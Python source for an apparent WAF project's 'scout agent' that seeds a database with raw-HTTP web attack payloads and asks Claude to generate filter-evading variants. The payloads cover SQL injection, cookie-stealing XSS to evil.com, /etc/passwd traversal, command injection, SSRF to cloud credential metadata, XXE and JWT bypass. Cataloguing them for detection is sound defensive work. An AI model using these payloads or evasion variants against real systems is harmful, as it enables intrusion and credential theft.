"""Peek — Scout Agent. Discovers new web application attack techniques."""

import anthropic
import json
import os
from datetime import datetime
from ..db.database import get_db

ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "")

# Seed techniques: real-world web attack payloads
SEED_TECHNIQUES = [
    {
        "technique_name": "Classic SQL injection (OR 1=1)",
        "category": "sqli",
        "source": "owasp/top-10",
        "raw_payload": "GET /api/users?id=1' OR '1'='1' -- HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "UNION-based SQL injection",
        "category": "sqli",
        "source": "owasp/top-10",
        "raw_payload": "GET /api/products?category=1 UNION SELECT username,password FROM users-- HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "Time-based blind SQLi",
        "category": "sqli",
        "source": "portswigger/sqli-cheat-sheet",
        "raw_payload": "GET /api/users?id=1' AND SLEEP(5)-- HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "Reflected XSS via script tag",
        "category": "xss",
        "source": "owasp/top-10",
        "raw_payload": "GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "XSS via event handler",
        "category": "xss",
        "source": "portswigger/xss-cheat-sheet",
        "raw_payload": "GET /search?q=<img src=x onerror=alert(document.domain)> HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "SVG-based XSS",
        "category": "xss",
        "source": "github/payloadsallthethings",
        "raw_payload": "POST /api/profile HTTP/1.1\nContent-Type: application/json\n\n{\"bio\": \"<svg/onload=fetch('//evil.com/'+document.cookie)>\"}",
        "severity": "high",
    },
    {
        "technique_name": "Path traversal (etc/passwd)",
        "category": "path_traversal",
        "source": "owasp/top-10",
        "raw_payload": "GET /api/files?path=../../../../etc/passwd HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "Double-encoded path traversal",
        "category": "path_traversal",
        "source": "portswigger/path-traversal",
        "raw_payload": "GET /api/files?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "OS command injection via semicolon",
        "category": "command_injection",
        "source": "owasp/top-10",
        "raw_payload": "POST /api/ping HTTP/1.1\nContent-Type: application/json\n\n{\"host\": \"8.8.8.8; cat /etc/passwd\"}",
        "severity": "critical",
    },
    {
        "technique_name": "SSRF to cloud metadata",
        "category": "ssrf",
        "source": "hackerone/ssrf-reports",
        "raw_payload": "POST /api/fetch-url HTTP/1.1\nContent-Type: application/json\n\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
        "severity": "critical",
    },
    {
        "technique_name": "SSRF via DNS rebinding",
        "category": "ssrf",
        "source": "github/ssrf-testing",
        "raw_payload": "POST /api/webhook HTTP/1.1\nContent-Type: application/json\n\n{\"callback_url\": \"http://7f000001.7f000002.rbndr.us:8080/admin\"}",
        "severity": "high",
    },
    {
        "technique_name": "XXE injection",
        "category": "xxe",
        "source": "owasp/top-10",
        "raw_payload": "POST /api/import HTTP/1.1\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "severity": "critical",
    },
    {
        "technique_name": "CRLF header injection",
        "category": "header_injection",
        "source": "portswigger/crlf-injection",
        "raw_payload": "GET /api/redirect?url=http://legit.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "Auth bypass via JWT none algorithm",
        "category": "auth_bypass",
        "source": "portswigger/jwt-attacks",
        "raw_payload": "GET /api/admin HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
        "severity": "critical",
    },
    {
        "technique_name": "URL-encoded command injection",
        "category": "command_injection",
        "source": "github/payloadsallthethings",
        "raw_payload": "GET /api/lookup?domain=example.com%26%26whoami HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "Null byte path traversal",
        "category": "path_traversal",
        "source": "github/payloadsallthethings",
        "raw_payload": "GET /api/download?file=....//....//etc/passwd%00.png HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
]


async def run():
    """Run the Peek scout agent. Discovers and catalogues new web attack techniques."""
    db = await get_db()
    client = anthropic.AsyncAnthropic(api_key=ANTHROPIC_API_KEY)
    added = 0

    # First, seed any techniques not already in DB
    for tech in SEED_TECHNIQUES:
        cursor = await db.execute(
            "SELECT id FROM threats WHERE technique_name = ?",
            (tech["technique_name"],),
        )
        if await cursor.fetchone() is None:
            await db.execute(
                """INSERT INTO threats (technique_name, category, source, raw_payload, severity, discovered_at)
                VALUES (?, ?, ?, ?, ?, ?)""",
                (
                    tech["technique_name"],
                    tech["category"],
                    tech["source"],
                    tech["raw_payload"],
                    tech["severity"],
                    datetime.utcnow().isoformat(),
                ),
            )
            added += 1

    # Then use Claude to generate novel variations of known techniques
    cursor = await db.execute("SELECT technique_name, raw_payload, category FROM threats LIMIT 5")
    known = await cursor.fetchall()

    if known:
        known_list = "\n".join(
            [f"- {row[0]} ({row[2]}): {row[1][:150]}" for row in known]
        )

        response = await client.messages.create(
            model="claude-sonnet-4-5-20250929",
            max_tokens=2000,
            system="""You are a security researcher cataloguing web application attack techniques for a WAF (web application firewall). Generate novel variations of known attacks that might bypass pattern-based detection.

Each payload should be a realistic raw HTTP request or request fragment showing the attack vector.

Output ONLY a JSON array of objects with keys: technique_name, category (sqli/xss/path_traversal/command_injection/ssrf/rce/header_injection/xxe/auth_bypass/encoding_evasion), raw_payload, severity (low/medium/high/critical).

Focus on evasion techniques: encoding tricks, case manipulation, comment insertion, alternative syntax, polyglot payloads.""",
            messages=[
                {
                    "role": "user",
                    "content": f"Here are known techniques. Generate 3 novel variations that use different evasion methods:\n{known_list}",
                }
            ],
        )

        content = response.content[0].text.strip()
        try:
            start_idx = content.find("[")
            end_idx = content.rfind("]") + 1
            if start_idx != -1 and end_idx > start_idx:
                novel_techniques = json.loads(content[start_idx:end_idx])
                for tech in novel_techniques:
                    cursor = await db.execute(
                        "SELECT id FROM threats WHERE technique_name = ?",
                        (tech.get("technique_name", ""),),
                    )
                    if await cursor.fetchone() is None:
                        await db.execute(
                            """INSERT INTO threats (technique_name, category, source, raw_payload, severity, discovered_at)
                            VALUES (?, ?, ?, ?, ?, ?)""",
                            (
                                tech.get("technique_name", "Unknown"),
                                tech.get("category", "sqli"),
                                "peek/claude-generated",
                                tech.get("raw_payload", ""),
                                tech.get("severity", "medium"),
                                datetime.utcnow().isoformat(),
                            ),
                        )
                        added += 1
        except (json.JSONDecodeError, IndexError):
            pass

    await db.commit()

    # Log agent activity
    await db.execute(
        "INSERT INTO agent_log (timestamp, agent, action, detail, success) VALUES (?, ?, ?, ?, ?)",
        (
            datetime.utcnow().isoformat(),
            "peek",
            "scan",
            f"Discovered {added} new attack techniques",
            1,
        ),
    )
    await db.commit()
    await db.close()
    return added
